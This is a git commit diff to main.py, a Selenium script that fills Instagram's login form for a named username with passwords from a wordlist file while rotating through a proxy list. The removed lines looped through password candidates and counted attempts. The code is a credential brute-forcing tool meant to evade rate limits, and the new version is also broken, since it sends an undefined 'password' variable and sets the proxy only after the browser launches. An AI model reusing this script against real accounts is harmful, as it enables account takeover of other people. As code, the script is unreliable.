743eae22bf211ea66e8b010a0eab4c6eab07e595
kushalr3ddy <pikkikushal@gmail.com>
2022-08-12 13:14:23 +0530

    reinstating

--- main.py
+++ main.py
@@ -1,4 +1,7 @@
-
+from selenium import webdriver 
+import argparse
+import time
+import random
 
 
 url='https://www.instagram.com/accounts/login/?force_classic_login'
@@ -8,38 +11,35 @@ for _ in proxies:
     proxy_list.append(_)
 #"https://instagram.com")
 
-def login(username:str,password:list):
+def login(username):
     firefox_profile = webdriver.FirefoxProfile()
-    print("starting firefox")
     firefox_profile.set_preference("browser.privatebrowsing.autostart", True)
     browser = webdriver.Firefox()
-    print("hehboi")
+    f = open("wordlist.txt","r")
+    pw = f.readline()
     browser.delete_all_cookies()
     print("[+] deleted all cookies")
     prox = random.choice(proxy_list)
     print(f"[+]using proxy:{prox}\n")
     webdriver.DesiredCapabilities.FIREFOX['proxy']={
-            "httpProxy":prox,
-            #"ftpProxy":prox,
+           "httpProxy":prox,
+            "ftpProxy":prox,
             "sslProxy":prox,
-            "noProxy":None,
+            #"noProxy":None,
             "proxyType":"manual"
-        }    
+        }
+    print("[+] opening instagram...")
     browser.get(url)
     time.sleep(2)
-    print(f"no of passwords:{len(password)}")
-    for pw in password:
-        attempt =1
-        print(f"\n[+]attempt:{attempt} \ntrying:{pw}")
-        browser.find_element_by_xpath("//*[@id=\"id_username\"]").clear()
-        browser.find_element_by_xpath("//*[@id=\"id_username\"]").send_keys(username)
-        browser.find_element_by_xpath("/html/body/div/section/div/div/form/p[2]/input").clear()
-        browser.find_element_by_xpath("/html/body/div/section/div/div/form/p[2]/input").send_keys(pw)
-        try:
-            browser.find_element_by_xpath("/html/body/div/section/div/div/form/p[3]/input").click()
-            attempt+=1
-            #return 0
-            #time.sleep(5)
-        except Exception as e:
-            print(e)
-            #return 1
+    browser.find_element_by_xpath("//*[@id=\"id_username\"]").clear()
+    browser.find_element_by_xpath("//*[@id=\"id_username\"]").send_keys(username)
+    browser.find_element_by_xpath("/html/body/div/section/div/div/form/p[2]/input").send_keys(password)
+    try:
+        browser.find_element_by_xpath("/html/body/div/section/div/div/form/p[3]/input").click()
+        #return 0
+        #time.sleep(5)
+    except Exception as e:
+        #return 1
+        print(e)
+
+login("kushalr3ddy")#,"notnoice")
